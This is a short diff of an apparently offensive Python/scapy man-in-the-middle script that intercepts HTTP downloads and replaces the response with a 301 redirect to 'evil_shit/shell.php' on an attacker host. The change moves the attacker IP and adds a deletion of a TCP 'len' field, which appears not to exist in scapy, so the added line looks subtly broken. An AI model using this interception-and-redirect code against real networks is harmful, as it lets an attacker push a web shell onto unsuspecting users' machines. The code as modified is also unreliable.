@@ -28,6 +28,7 @@ def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
+    del packet[scapy.TCP].len
     del packet[scapy.TCP].chksum
     return packet
 
@@ -43,7 +44,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
-                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.27/evil_shit/shell.php\n\n"
+                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/evil_shit/shell.php\n\n"
                 modified_packet = set_load(scapy_packet, http_redirect)
                 packet.set_payload(str(modified_packet))
 
